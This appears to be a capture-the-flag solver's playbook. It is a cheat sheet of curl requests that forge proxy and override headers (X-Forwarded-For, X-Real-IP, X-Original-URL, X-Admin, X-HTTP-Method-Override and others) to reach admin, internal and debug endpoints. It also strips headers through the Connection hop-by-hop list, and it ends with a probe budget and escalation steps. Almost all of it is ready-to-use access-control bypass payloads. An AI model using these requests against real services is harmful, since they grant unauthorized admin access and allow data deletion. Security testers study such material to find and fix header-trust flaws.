# Per-header — every proxy header, exhaustively

The header map — a header the app reads, a check the header gates.

---

## 1. X-Real-IP — the client-IP header

```bash
# a client-supplied X-Real-IP — a forged local IP
curl "$BASE/api/admin" -H 'X-Real-IP: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'X-Real-IP: ::1'   # a forged localhost
curl "$BASE/api/admin" -H 'X-Real-IP: 10.0.0.1'   # a forged internal IP
curl "$BASE/api/admin" -H 'Connection: keep-alive, X-Real-IP'   # the strip
```

## 2. X-Forwarded-For — the forwarded-IP header

```bash
# a client-supplied X-Forwarded-For — a forged local IP
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1, 8.8.8.8'   # a chained forwarded
curl "$BASE/api/admin" -H 'X-Forwarded-For: ::1'   # a forged localhost
curl "$BASE/api/admin" -H 'X-Forwarded-For: 10.0.0.1'   # a forged internal IP
curl "$BASE/api/admin" -H 'Connection: keep-alive, X-Forwarded-For'   # the strip
```

## 3. X-Forwarded-Host — the forwarded-host header

```bash
# a client-supplied X-Forwarded-Host — a forged host
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # a forged host
curl "$BASE/page" -H 'X-Forwarded-Host: target.com'   # a forged same-host
curl "$BASE/page" -H 'X-Forwarded-Host: 127.0.0.1'   # a forged localhost
curl "$BASE/page" -H 'Connection: keep-alive, X-Forwarded-Host'   # the strip
```

## 4. X-Forwarded-Proto — the forwarded-proto header

```bash
# a client-supplied X-Forwarded-Proto — a forged proto
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # a forged proto
curl "$BASE/page" -H 'X-Forwarded-Proto: https'   # a forged https
curl "$BASE/page" -H 'X-Forwarded-Proto: http, https'   # a chained proto
curl "$BASE/page" -H 'Connection: keep-alive, X-Forwarded-Proto'   # the strip
```

## 5. X-Forwarded-Scheme — the forwarded-scheme header

```bash
# a client-supplied X-Forwarded-Scheme — a forged scheme
curl "$BASE/page" -H 'X-Forwarded-Scheme: http'   # a forged scheme
curl "$BASE/page" -H 'X-Forwarded-Scheme: https'   # a forged https
curl "$BASE/page" -H 'X-Forwarded-Scheme: http, https'   # a chained scheme
curl "$BASE/page" -H 'Connection: keep-alive, X-Forwarded-Scheme'   # the strip
```

## 6. X-Forwarded-User — the forwarded-user header

```bash
# a client-supplied X-Forwarded-User — a forged user
curl "$BASE/api/user" -H 'X-Forwarded-User: admin'   # a forged admin user
curl "$BASE/api/user" -H 'X-Forwarded-User: user'   # a forged user
curl "$BASE/api/user" -H 'X-Forwarded-User: root'   # a forged root
curl "$BASE/api/user" -H 'Connection: keep-alive, X-Forwarded-User'   # the strip
```

## 7. X-Forwarded-Email — the forwarded-email header

```bash
# a client-supplied X-Forwarded-Email — a forged email
curl "$BASE/api/user" -H 'X-Forwarded-Email: admin@target.com'   # a forged email
curl "$BASE/api/user" -H 'X-Forwarded-Email: user@target.com'   # a forged user
curl "$BASE/api/user" -H 'Connection: keep-alive, X-Forwarded-Email'   # the strip
```

## 8. X-Forwarded-Server — the forwarded-server header

```bash
# a client-supplied X-Forwarded-Server — a forged server
curl "$BASE/api" -H 'X-Forwarded-Server: 127.0.0.1'   # a forged server
curl "$BASE/api" -H 'X-Forwarded-Server: internal'   # a forged internal server
curl "$BASE/api" -H 'Connection: keep-alive, X-Forwarded-Server'   # the strip
```

## 9. X-Forwarded-Port — the forwarded-port header

```bash
# a client-supplied X-Forwarded-Port — a forged port
curl "$BASE/api" -H 'X-Forwarded-Port: 80'   # a forged port
curl "$BASE/api" -H 'X-Forwarded-Port: 443'   # a forged port
curl "$BASE/api" -H 'Connection: keep-alive, X-Forwarded-Port'   # the strip
```

## 10. X-Client-IP — the client-IP header

```bash
# a client-supplied X-Client-IP — a forged local IP
curl "$BASE/api/admin" -H 'X-Client-IP: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'Connection: keep-alive, X-Client-IP'   # the strip
```

## 11. True-Client-IP — the true-client-IP header

```bash
# a client-supplied True-Client-IP — a forged local IP
curl "$BASE/api/admin" -H 'True-Client-IP: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'Connection: keep-alive, True-Client-IP'   # the strip
```

## 12. Forwarded — the RFC 7239 forwarded header

```bash
# a client-supplied Forwarded header — a forged local IP
curl "$BASE/api/admin" -H 'Forwarded: for=127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'Forwarded: for=127.0.0.1;host=attacker.com;proto=http'   # a chained forwarded
curl "$BASE/api/admin" -H 'Forwarded: for=::1'   # a forged localhost
curl "$BASE/api/admin" -H 'Connection: keep-alive, Forwarded'   # the strip
```

## 13. X-Original-URL — the original-URL header

```bash
# a client-supplied X-Original-URL — a forged path
curl "$BASE/page" -H 'X-Original-URL: /admin'   # a forged path
curl "$BASE/page" -H 'X-Original-URL: /internal'   # a forged internal path
curl "$BASE/page" -H 'Connection: keep-alive, X-Original-URL'   # the strip
```

## 14. X-Rewrite-URL — the rewrite-URL header

```bash
# a client-supplied X-Rewrite-URL — a forged path
curl "$BASE/page" -H 'X-Rewrite-URL: /admin'   # a forged path
curl "$BASE/page" -H 'X-Rewrite-URL: /internal'   # a forged internal path
curl "$BASE/page" -H 'Connection: keep-alive, X-Rewrite-URL'   # the strip
```

## 15. X-Forwarded-Path — the forwarded-path header

```bash
# a client-supplied X-Forwarded-Path — a forged path
curl "$BASE/page" -H 'X-Forwarded-Path: /admin'   # a forged path
curl "$BASE/page" -H 'X-Forwarded-Path: /internal'   # a forged internal path
curl "$BASE/page" -H 'Connection: keep-alive, X-Forwarded-Path'   # the strip
```

## 16. X-Forwarded-Prefix — the forwarded-prefix header

```bash
# a client-supplied X-Forwarded-Prefix — a forged prefix
curl "$BASE/page" -H 'X-Forwarded-Prefix: /admin'   # a forged prefix
curl "$BASE/page" -H 'X-Forwarded-Prefix: /internal'   # a forged internal prefix
curl "$BASE/page" -H 'Connection: keep-alive, X-Forwarded-Prefix'   # the strip
```

## 17. X-Original-Path — the original-path header

```bash
# a client-supplied X-Original-Path — a forged path
curl "$BASE/page" -H 'X-Original-Path: /admin'   # a forged path
curl "$BASE/page" -H 'X-Original-Path: /internal'   # a forged internal path
curl "$BASE/page" -H 'Connection: keep-alive, X-Original-Path'   # the strip
```

## 18. X-Real-Path — the real-path header

```bash
# a client-supplied X-Real-Path — a forged path
curl "$BASE/page" -H 'X-Real-Path: /admin'   # a forged path
curl "$BASE/page" -H 'X-Real-Path: /internal'   # a forged internal path
curl "$BASE/page" -H 'Connection: keep-alive, X-Real-Path'   # the strip
```

## 19. X-Internal — the internal header

```bash
# a client-supplied X-Internal — a forged internal flag
curl "$BASE/internal" -H 'X-Internal: true'   # a forged internal flag
curl "$BASE/internal" -H 'X-Internal: 1'   # a forged internal flag
curl "$BASE/internal" -H 'Connection: keep-alive, X-Internal'   # the strip
```

## 20. X-Admin — the admin header

```bash
# a client-supplied X-Admin — a forged admin flag
curl "$BASE/admin" -H 'X-Admin: true'   # a forged admin flag
curl "$BASE/admin" -H 'X-Admin: 1'   # a forged admin flag
curl "$BASE/admin" -H 'Connection: keep-alive, X-Admin'   # the strip
```

## 21. X-Debug — the debug header

```bash
# a client-supplied X-Debug — a forged debug flag
curl "$BASE/api/debug" -H 'X-Debug: true'   # a forged debug flag
curl "$BASE/api/debug" -H 'X-Debug: 1'   # a forged debug flag
curl "$BASE/api/debug" -H 'Connection: keep-alive, X-Debug'   # the strip
```

## 22. X-HTTP-Method-Override — the method-override header

```bash
# a client-supplied X-HTTP-Method-Override — a forged method
curl "$BASE/api" -H 'X-HTTP-Method-Override: DELETE' -d 'data'   # a forged method
curl "$BASE/api" -H 'X-HTTP-Method-Override: PUT' -d 'data'   # a forged PUT
curl "$BASE/api" -H 'X-HTTP-Method-Override: PATCH' -d 'data'   # a forged PATCH
curl "$BASE/api" -H 'Connection: keep-alive, X-HTTP-Method-Override'   # the strip
```

## 23. X-Original-Method — the original-method header

```bash
# a client-supplied X-Original-Method — a forged method
curl "$BASE/api" -H 'X-Original-Method: DELETE' -d 'data'   # a forged method
curl "$BASE/api" -H 'X-Original-Method: PUT' -d 'data'   # a forged PUT
curl "$BASE/api" -H 'Connection: keep-alive, X-Original-Method'   # the strip
```

## 24. X-HTTP-Method — the method header

```bash
# a client-supplied X-HTTP-Method — a forged method
curl "$BASE/api" -H 'X-HTTP-Method: DELETE' -d 'data'   # a forged method
curl "$BASE/api" -H 'X-HTTP-Method: PUT' -d 'data'   # a forged PUT
curl "$BASE/api" -H 'Connection: keep-alive, X-HTTP-Method'   # the strip
```

## 25. X-Method-Override — the method-override header

```bash
# a client-supplied X-Method-Override — a forged method
curl "$BASE/api" -H 'X-Method-Override: DELETE' -d 'data'   # a forged method
curl "$BASE/api" -H 'X-Method-Override: PUT' -d 'data'   # a forged PUT
curl "$BASE/api" -H 'Connection: keep-alive, X-Method-Override'   # the strip
```

## 26. The per-header falsifier — when the header is dead

```text
a proxy that doesn't strip its own header → the hop-by-hop bypass fails
a proxy that strips a client-supplied header → the client-supplied
  bypass fails → the hop-by-hop bypass is the vector
a proxy that verifies the header it added → the client-supplied bypass
  fails → the hop-by-hop bypass is the vector
a non-header check → a different class
```

## 27. The per-header budget — the probe limits

```text
5 probes or 15 minutes per mechanism class; 25 probes or 45 minutes
for the challenge. a spent budget → escalate: chain_match → reclassify
→ writeup_search → novel_plan → fanout_sweep → solver_handoff.
```
